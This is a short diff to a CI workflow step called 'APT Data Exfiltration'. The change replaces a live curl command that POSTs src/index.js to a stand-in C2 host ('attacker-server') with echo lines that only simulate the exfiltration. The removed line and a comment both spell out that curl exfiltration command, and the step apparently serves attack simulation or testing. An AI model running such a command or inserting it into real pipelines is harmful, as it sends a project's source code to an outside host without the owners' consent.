@@ -52,5 +52,8 @@ jobs:
     steps:
       - name: APT Data Exfiltration
         run: |
-          echo "Sending data to C2 server..."
-          curl -X POST -d @src/index.js http://attacker-server/data
+          echo "Simulating data exfiltration to C2 server..."
+          echo "POST http://attacker-server/data — would send src/index.js"
+          echo "Simulated payload size: $(wc -c < src/index.js) bytes"
+          # In a real attack: curl -X POST -d @src/index.js http://attacker-server/data
+          # This simulation only echoes what would happen — no real network calls.
